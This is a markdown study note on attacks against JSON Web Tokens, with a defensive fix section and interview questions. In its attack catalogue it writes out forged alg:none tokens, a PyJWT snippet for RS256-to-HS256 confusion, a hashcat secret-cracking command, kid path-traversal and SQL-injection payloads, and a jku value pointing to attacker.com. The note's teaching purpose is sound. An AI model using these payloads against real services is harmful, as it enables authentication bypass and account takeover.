---
tags: [identity, jwt, tokens]
difficulty: medium
status: learning
---

# JWT Attacks

> JSON Web Tokens are everywhere — OIDC ID tokens, API auth, stateless sessions, password-reset links. They're also a reliable source of *critical* bugs, because a JWT is only as trustworthy as the code that **verifies** it, and that verification is frequently wrong, disabled, or bypassable. A single JWT flaw is usually full authentication bypass.

---

## 1. Anatomy

```
eyJhbGciOiJIUzI1NiJ9  .  eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ  .  <signature>
└──── header ────┘      └──────────── payload ────────────┘    └── sig ──┘

header:  {"alg":"HS256","typ":"JWT"}
payload: {"sub":"1","role":"user","exp":1893456000}
signature: HMAC-SHA256( base64url(header) + "." + base64url(payload), secret )
```

**Critical facts:**
- Header and payload are **base64url, not encrypted** — anyone can decode and read them. Never put secrets/PII in a JWT payload (use JWE if you need confidentiality).
- The **signature is the only thing** stopping tampering. Break or skip verification and every claim is attacker-controlled.
- The **`alg` header is attacker-controlled** — trusting it to decide *how* to verify is the root of two classic attacks.

---

## 2. The attack catalogue

| # | Attack | Root cause | Result |
|---|---|---|---|
| 1 | **`alg: none`** | Server accepts unsigned tokens | Forge any claim, no key needed |
| 2 | **RS256 → HS256 confusion** | Server picks verify algo from the token's `alg` | Sign with the *public* key as HMAC secret → forge |
| 3 | **Weak HMAC secret** | `HS256` with a guessable secret | Crack offline → mint any token |
| 4 | **`kid` injection** | `kid` header used in a file path / SQL query | Path traversal, SQLi, or point to a known key |
| 5 | **`jku` / `x5u` SSRF** | Server fetches the signing key from a token-supplied URL | Host your own JWKS → sign with your key |
| 6 | **No signature verification** | Dev calls `decode` not `verify` | Tamper freely |
| 7 | **No expiry / claim checks** | `exp`/`aud`/`iss` ignored | Replay stolen/cross-service tokens |
| 8 | **No revocation** | Stateless design | Can't force logout; stolen token valid till expiry |

### Attack 1 — `alg: none`
The spec allows an "unsecured" JWT with `alg: none` and an empty signature. If the server honours it:
```
header  = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"sub":"1","role":"admin"})
token   = header + "." + payload + "."          ← note trailing dot, empty sig
```
Variations to try: `none`, `None`, `NONE`, `nOnE` (case-sensitive filters miss these).

### Attack 2 — RS256 → HS256 algorithm confusion
The server uses **RS256** (asymmetric): it verifies with the RSA *public* key. If the verification code lets the *token* choose the algorithm, an attacker:
1. Changes `alg` to `HS256`.
2. Signs the token with **HMAC-SHA256 using the RSA public key (which is public) as the secret**.
3. The server, told `HS256`, verifies with... the same public key as the HMAC key → **valid**.
```python
# attacker side
import jwt   # PyJWT
public_key = open("public.pem").read()          # public → attacker has it
forged = jwt.encode({"sub":"1","role":"admin"}, public_key, algorithm="HS256")
```
Getting the public key: it's often at `/jwks.json`, `/.well-known/jwks.json`, in TLS certs, or derivable from two tokens (tooling: `rsa_sign2n`).

### Attack 3 — weak HMAC secret
```bash
hashcat -a 0 -m 16500 token.jwt rockyou.txt      # cracks HS256 secrets
# or: jwt_tool, john
```
If the secret is `secret`, `password`, the app name, etc., you recover it and mint arbitrary tokens. Real apps ship with default secrets constantly.

### Attack 4 — `kid` (Key ID) injection
`kid` tells the server which key to use. If it's used unsafely:
```
"kid": "../../../../dev/null"   → key = empty file → sign tokens with empty key
"kid": "key1' UNION SELECT 'attacker_known_secret'--"   → SQLi returns a key you control
"kid": "/proc/self/environ"     → predictable file as the key
```

### Attack 5 — `jku` / `x5u` header SSRF
`jku` points to a JWKS URL. If the server fetches it from the token without allowlisting:
```
"jku": "https://attacker.com/jwks.json"
```
Host a JWKS with *your* public key; sign the token with *your* private key → server fetches your key → validates. (Also a straight [[SSRF-Server-Side-Request-Forgery]] primitive.)

---

## 3. Detection / testing checklist
- Decode the token (jwt.io / `jwt_tool`) — read `alg`, `kid`, `jku`, claims.
- Try `alg: none` variants.
- If RS256: attempt HS256 confusion with the public key.
- If HS256: run hashcat against it.
- Tamper `kid`/`jku`/`x5u`.
- Change a claim (`role`, `sub`) and see if it's accepted (tests whether sig is checked at all).
- Remove `exp` or set it far future; replay an expired token.
- Reuse a token from one service/audience against another (`aud` check).
- **Tool:** `jwt_tool` automates most of this (`python3 jwt_tool.py <token> -M at`).

---

## 4. The fix

```python
# ✅ pin the algorithm explicitly — never let the token choose
import jwt
decoded = jwt.decode(
    token,
    key=public_key,
    algorithms=["RS256"],          # ← allowlist; kills alg:none AND RS/HS confusion
    audience="my-client-id",       # validate aud
    issuer="https://as.example.com",
    options={"require": ["exp", "iat", "aud", "iss"]},
)
```
- **Always verify the signature, server-side.** Use the library's `verify`/`decode-with-verify`, never a bare decode.
- **Pin `alg` to an explicit allowlist** — this single control kills `alg:none` and RS/HS confusion.
- Strong HMAC secrets (≥256-bit random) or asymmetric keys → see [[Cryptography-Fundamentals]].
- **Validate all claims:** `exp`, `nbf`, `iss`, `aud`, and `sub`/`nonce` where relevant.
- **Ignore or strictly allowlist** `kid`, `jku`, `x5u` — never build file paths / SQL / fetch URLs from them.
- Don't store sensitive data in the payload (readable).
- **Revocation:** JWTs can't be un-issued. For *sessions*, this means a logged-out or compromised token stays valid until `exp`. Either keep expiry short + a server-side denylist, or use **opaque server-side session tokens** instead (see [[Session-Management]]) — a common interview point about the downside of "stateless" auth.

---

## 5. Real-world cases
- **Auth0 `node-jsonwebtoken` (CVE-2015-9235)** and many library CVEs — `alg` confusion and `alg:none` acceptance in popular libraries; the reason "pin the algorithm" became standard advice.
- **Countless API/appliance CVEs** — hardcoded/default HMAC secrets in commercial products, cracked → full auth bypass.
- Bug bounty: RS→HS confusion and `jku` bugs regularly pay high on APIs that roll their own verification.

---

## 6. Practice + interview questions

### Practice
- **PortSwigger Academy → JWT** — all labs (`alg:none`, weak secret with hashcat, `jku` injection, `kid` path traversal, algorithm confusion). This is one of the best-designed lab sets they have.
- Crack a weak-secret JWT with hashcat, then forge an admin token.
- Perform the RS→HS confusion attack end-to-end against a lab.

### Interview questions
- *Is a JWT encrypted?* (No — signed. Base64url, readable. Use JWE for confidentiality.)
- *Explain the RS256→HS256 confusion attack.* (Server verifies with the public key but the token claims HS256; attacker signs HMAC using that public key as the secret. Fix: pin the algorithm.)
- *What is `alg:none` and how do you defend?* (Unsecured JWT accepted; allowlist algorithms, never honour `none`.)
- *How do you revoke a JWT?* (You can't cleanly — that's the tradeoff of stateless tokens; need a denylist or short expiry, which reintroduces server state. A reason to prefer opaque server-side sessions for user sessions.)
- *Besides the signature, what must you validate?* (`exp`, `nbf`, `iss`, `aud` — and `nonce` for OIDC ID tokens.)
- *You control the `kid` header — what do you try?* (Path traversal to a known/empty key file, SQLi if it's a DB lookup, point to a predictable file.)
- *What's the risk of the `jku` header?* (Server fetches the signing key from a URL you supply → host your own JWKS and forge; also SSRF.)

---

**Related:** [[OAuth2-and-OIDC]] · [[Session-Management]] · [[Cryptography-Fundamentals]] · [[SSRF-Server-Side-Request-Forgery]]
